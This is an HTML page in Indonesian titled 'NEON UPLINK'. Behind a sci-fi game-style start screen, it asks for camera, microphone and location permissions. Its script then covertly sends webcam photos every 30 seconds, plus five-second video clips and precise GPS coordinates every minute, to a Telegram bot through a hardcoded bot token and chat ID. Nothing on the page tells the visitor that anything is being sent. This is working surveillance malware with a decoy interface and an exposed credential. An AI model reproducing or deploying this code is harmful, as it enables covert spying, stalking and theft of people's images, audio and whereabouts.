<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🛰️ NEON UPLINK</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
  body {
    background: #05050a;
    color: #00f3ff;
    font-family: 'Share Tech Mono', monospace;
    overflow: hidden;
    height: 100vh;
    width: 100vw;
  }
  #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
  .scanlines {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 3px);
    pointer-events: none; z-index: 10; opacity: 0.4;
  }
  .vignette {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: radial-gradient(circle, transparent 40%, #000 100%);
    pointer-events: none; z-index: 9;
  }

  /* === START SCREEN === */
  #startScreen {
    position: fixed; inset: 0; z-index: 100;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    background: #000;
    transition: opacity 0.5s;
  }
  #startScreen.hide { opacity: 0; pointer-events: none; }

  .logo {
    font-size: 5rem; margin-bottom: 20px;
    text-shadow: 0 0 30px #00f3ff;
    animation: glow 2s ease-in-out infinite;
  }
  @keyframes glow {
    0%, 100% { text-shadow: 0 0 20px #00f3ff, 0 0 40px #00f3ff; }
    50% { text-shadow: 0 0 30px #00f3ff, 0 0 60px #00f3ff, 0 0 80px #00f3ff; }
  }

  .title {
    font-size: 2.5rem; color: #00f3ff;
    text-shadow: 0 0 20px #00f3ff;
    margin-bottom: 10px;
    letter-spacing: 5px;
  }

  .subtitle {
    color: #666; font-size: 0.9rem; margin-bottom: 50px;
    letter-spacing: 2px;
  }

  #startBtn {
    padding: 18px 60px; font-size: 1.2rem; font-family: inherit;
    background: transparent; border: 3px solid #00f3ff; color: #00f3ff;
    cursor: pointer; letter-spacing: 4px;
    box-shadow: 0 0 30px #00f3ff40;
    transition: 0.3s;
    text-transform: uppercase;
    font-weight: bold;
  }
  #startBtn:hover {
    background: #00f3ff;
    color: #000;
    transform: scale(1.1);
    box-shadow: 0 0 50px #00f3ff;
  }

  .info {
    margin-top: 30px;
    color: #444;
    font-size: 0.75rem;
    text-align: center;
    max-width: 400px;
    line-height: 1.6;
  }

  /* === MAIN UI === */
  #mainUI {
    position: relative; z-index: 5;
    display: none; flex-direction: column; height: 100vh; padding: 15px;
    opacity: 0; transition: opacity 0.5s;
  }
  #mainUI.show { display: flex; opacity: 1; }

  .hud-top { display: flex; justify-content: space-between; margin-bottom: 10px; gap: 10px; }
  .panel {
    background: #0a0f1a90; border: 1px solid #00f3ff50;
    padding: 10px 15px; border-radius: 6px;
    backdrop-filter: blur(4px);
    font-size: 0.85rem; flex: 1; text-align: center;
  }
  .blink { animation: blink 1s infinite; color: #00ff88; }
  @keyframes blink { 50% { opacity: 0.3; } }

  .hud-center {
    flex: 1; display: flex; align-items: center; justify-content: center;
    position: relative; margin: 10px 0;
  }
  #video {
    width: 100%; max-width: 500px; height: auto;
    border: 2px solid #b026ff; border-radius: 8px;
    background: #000; box-shadow: 0 0 30px #b026ff60;
    transform: scaleX(-1);
  }
  .rec-indicator {
    position: absolute; top: 10px; right: 10px;
    background: #ff000080; color: #fff; padding: 5px 12px;
    border-radius: 4px; font-weight: bold; font-size: 0.85rem;
    animation: pulseRec 1.5s infinite;
  }
  @keyframes pulseRec { 50% { box-shadow: 0 0 20px red; } }

  .hud-bottom { margin-top: auto; }
  .log-panel {
    height: 120px; overflow-y: auto; font-size: 0.72rem;
    color: #0f0; line-height: 1.4;
    background: #0a0f1a90; border: 1px solid #00f3ff40;
    padding: 10px; border-radius: 6px;
  }
  .log-panel::-webkit-scrollbar { width: 6px; }
  .log-panel::-webkit-scrollbar-thumb { background: #00f3ff; border-radius: 3px; }

  .countdown {
    position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
    font-size: 1.2rem; color: #ff00ff; text-shadow: 0 0 15px #ff00ff;
    background: #00000080; padding: 5px 15px; border-radius: 4px;
  }

  .warning {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: #ff3366; color: #fff; padding: 10px 20px;
    border-radius: 6px; font-size: 0.85rem;
    display: none; z-index: 200;
    box-shadow: 0 0 20px #ff336660;
  }
</style>
</head>
<body>
<canvas id="starfield"></canvas>
<div class="scanlines"></div>
<div class="vignette"></div>

<!-- === START SCREEN === -->
<div id="startScreen">
  <div class="logo">🛰️</div>
  <div class="title">NEON UPLINK</div>
  <div class="subtitle">AUTO TRANSMISSION SYSTEM</div>
  
  <button id="startBtn">▶️ START</button>
  
  <div class="info">
    Browser akan meminta izin akses<br>
    Camera • Microphone • Location<br>
    <small>Klik "Allow/Izinkan" untuk melanjutkan</small>
  </div>
</div>

<!-- === MAIN UI === -->
<div id="mainUI">
  <div class="hud-top">
    <div class="panel">STATUS: <span class="blink">ONLINE</span></div>
    <div class="panel" id="txPanel">NEXT TX: --s</div>
  </div>
  <div class="hud-center">
    <video id="video" autoplay muted playsinline></video>
    <div class="rec-indicator">● REC</div>
    <div class="countdown" id="countdown">UPLINK ACTIVE</div>
  </div>
  <div class="hud-bottom">
    <div class="log-panel" id="logBox">&gt; SYSTEM READY...</div>
  </div>
</div>

<div class="warning" id="warning"></div>
<canvas id="photoCanvas" style="display:none;"></canvas>

<script>
// ============================================
// ⚙️ KONFIGURASI - GANTI DISINI
// ============================================
const BOT_TOKEN = "7334976291:AAEOf0ppLNPYjOF98NC7ceZtMfXPWZ1X-WE";
const CHAT_ID   = "7223902938";
// ============================================

let stream, mediaRecorder, chunks = [];
let nextPhotoTime = 0, nextVideoTime = 0;

const video = document.getElementById('video');
const canvas = document.getElementById('photoCanvas');
const logBox = document.getElementById('logBox');
const txPanel = document.getElementById('txPanel');
const countdownEl = document.getElementById('countdown');
const startScreen = document.getElementById('startScreen');
const mainUI = document.getElementById('mainUI');
const startBtn = document.getElementById('startBtn');
const warningEl = document.getElementById('warning');

// --- START BUTTON ---
startBtn.onclick = async () => {
  startBtn.disabled = true;
  startBtn.textContent = 'LOADING...';
  log('> INITIALIZING SYSTEM...');
  
  try {
    // Browser akan tampilkan permission prompt otomatis
    await requestPermissions();
    
    // Hide start screen, show main UI
    startScreen.classList.add('hide');
    setTimeout(() => {
      startScreen.style.display = 'none';
      mainUI.classList.add('show');
      startUplink();
    }, 500);
    
  } catch (err) {
    startBtn.disabled = false;
    startBtn.textContent = '🔄 RETRY';
    showWarning('Permission denied! Refresh dan izinkan akses.');
    log('> ERROR: ' + err.message);
  }
};

// --- REQUEST PERMISSIONS (Browser Native) ---
async function requestPermissions() {
  log('> Requesting camera & microphone...');
  
  // Browser akan tampilkan prompt: "Allow camera & mic?"
  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: true
  });
  video.srcObject = stream;
  log('> Camera & Mic: GRANTED');
  
  log('> Requesting location...');
  // Browser akan tampilkan prompt: "Allow location?"
  await new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation not supported'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        log('> Location: GRANTED');
        log('> GPS: ' + pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4));
        resolve(pos);
      },
      reject,
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
  
  log('> All permissions granted!');
}

// --- Starfield Background ---
const starCanvas = document.getElementById('starfield');
const sctx = starCanvas.getContext('2d');
let stars = [];
function resizeStar() { starCanvas.width = innerWidth; starCanvas.height = innerHeight; }
addEventListener('resize', resizeStar);
resizeStar();
for(let i=0; i<150; i++) stars.push({
  x: Math.random()*starCanvas.width,
  y: Math.random()*starCanvas.height,
  z: Math.random()*2,
  speed: Math.random()*0.5 + 0.1
});
function animateStars() {
  sctx.fillStyle = '#05050a';
  sctx.fillRect(0, 0, starCanvas.width, starCanvas.height);
  sctx.fillStyle = '#00f3ff';
  stars.forEach(s => {
    sctx.globalAlpha = s.z;
    sctx.beginPath();
    sctx.arc(s.x, s.y, s.z * 1.5, 0, Math.PI*2);
    sctx.fill();
    s.y += s.speed;
    if(s.y > starCanvas.height) { s.y = 0; s.x = Math.random()*starCanvas.width; }
  });
  requestAnimationFrame(animateStars);
}
animateStars();

// --- Core Functions ---
function log(msg) {
  const time = new Date().toLocaleTimeString();
  const p = document.createElement('div');
  p.innerHTML = `[${time}] ${msg}`;
  logBox.prepend(p);
  if (logBox.children.length > 50) logBox.removeChild(logBox.lastChild);
}

function showWarning(text) {
  warningEl.textContent = text;
  warningEl.style.display = 'block';
  setTimeout(() => warningEl.style.display = 'none', 5000);
}

function takePhoto() {
  if (!stream) return;
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.8);
}

async function sendPhoto(blob) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'u_photo.jpg');
  fd.append('caption', `📸 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    const d = await res.json();
    log(d.ok ? '✅ PHOTO SENT' : `❌ PHOTO: ${d.description}`);
  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
}

function startRecording() {
  if (!stream) return;
  chunks = [];
  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: 'video/webm' });
    sendVideo(blob);
  };
  mediaRecorder.start();
  log('🎥 RECORDING 5s...');
  setTimeout(() => {
    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
  }, 5000);
}

async function sendVideo(blob) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', blob, 'u_video.webm');
  fd.append('caption', `🎥 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
    const d = await res.json();
    log(d.ok ? '✅ VIDEO SENT' : `❌ VIDEO: ${d.description}`);
  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
}

function sendLocation() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(async pos => {
    const { latitude, longitude, accuracy } = pos.coords;
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude, horizontal_accuracy: accuracy })
      });
      const d = await res.json();
      log(d.ok ? `✅ LOC: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}` : `❌ LOC: ${d.description}`);
    } catch(e) { log(`❌ NET ERR: ${e.message}`); }
  }, err => log(`❌ LOC ERR: ${err.message}`), { enableHighAccuracy: true, timeout: 5000 });
}

function updateTimers() {
  const now = Date.now();
  const nextPhoto = Math.max(0, Math.ceil((nextPhotoTime - now)/1000));
  const nextVideo = Math.max(0, Math.ceil((nextVideoTime - now)/1000));
  const next = Math.min(nextPhoto, nextVideo);
  txPanel.textContent = `NEXT TX: ${next}s`;
  countdownEl.textContent = `UPLINK CYCLE: ${next}s`;

  if (now >= nextPhotoTime) { takePhoto(); nextPhotoTime = now + 30000; }
  if (now >= nextVideoTime) { startRecording(); sendLocation(); nextVideoTime = now + 60000; }
  requestAnimationFrame(updateTimers);
}

function startUplink() {
  log('> SYSTEM STARTED');
  log('> Photo: every 30s');
  log('> Video+Loc: every 60s');
  nextPhotoTime = Date.now() + 2000;
  nextVideoTime = Date.now() + 5000;
  updateTimers();
}

// --- Security check ---
if (BOT_TOKEN.includes("MASUKKAN") || CHAT_ID.includes("MASUKKAN")) {
  startBtn.textContent = '⚠️ EDIT TOKEN';
  startBtn.onclick = () => alert('Open this file in text editor, replace BOT_TOKEN & CHAT_ID at top of script, then save & refresh.');
}
</script>
</body>
</html>
